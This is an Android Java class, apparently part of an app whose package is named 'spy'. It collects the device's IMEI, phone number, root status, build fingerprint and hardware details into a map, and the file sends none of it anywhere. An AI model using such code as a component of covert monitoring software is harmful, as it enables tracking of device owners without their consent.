package com.example.spy.device.hardware;

import android.content.Context;

import java.text.SimpleDateFormat;
import java.util.HashMap;
import java.util.Map;

import github.nisrulz.easydeviceinfo.base.EasyDeviceMod;
import github.nisrulz.easydeviceinfo.base.EasyLocationMod;

public class DeviceState {
    private static String DATE_PATERN = "yyyy-MM-dd";
    private Map<String, String> info = new HashMap<>();

    public DeviceState(Context context) {
        EasyDeviceMod easyDeviceMod = new EasyDeviceMod(context);
        try {
            info.put("IMEI", easyDeviceMod.getIMEI());
            info.put("PHONE_NUMBER", easyDeviceMod.getPhoneNo());
        } catch (SecurityException e) {
            info.put("IMEI", "Cannot get IMEI!");
            info.put("PHONE_NUMBER", "Cannot get phone number!");
        }

        info.put("BUILD_VERSION_CODENAME", easyDeviceMod.getBuildVersionCodename());
        info.put("BUILD_VERSION_INCREMENTAL", easyDeviceMod.getBuildVersionIncremental());
        info.put("BUILD_VERSION_SDK", String.valueOf(easyDeviceMod.getBuildVersionSDK()));
        info.put("BUILD_ID", easyDeviceMod.getBuildID());
        info.put("MANUFACTURER", easyDeviceMod.getManufacturer());
        info.put("MODEL", easyDeviceMod.getModel());
        info.put("OS_CODENAME", easyDeviceMod.getOSCodename());
        info.put("OS_VERSION", easyDeviceMod.getOSVersion());
        info.put("RADIO_VERSION", easyDeviceMod.getRadioVer());
        info.put("PRODUCT", easyDeviceMod.getProduct());
        info.put("DEVICE", easyDeviceMod.getDevice());
        info.put("BOARD", easyDeviceMod.getBoard());
        info.put("HARDWARE", easyDeviceMod.getHardware());
        info.put("BOOTLOADER", easyDeviceMod.getBootloader());
        info.put("FINGERPRINT", easyDeviceMod.getFingerprint());
        info.put("IS_ROOTED", String.valueOf(easyDeviceMod.isDeviceRooted()));
        info.put("BUILD_BRAND", easyDeviceMod.getBuildBrand());
        info.put("BUILD_HOST", easyDeviceMod.getBuildHost());
        info.put("BUILD_TAGS", easyDeviceMod.getBuildTags());
        info.put("BUILD_TIME", new SimpleDateFormat(DATE_PATERN).format(easyDeviceMod.getBuildTime()));
        info.put("BUILD_VERSION_RELEASE", easyDeviceMod.getBuildVersionRelease());
    }

    public Map<String, String> getData() {
        return info;
    }
}
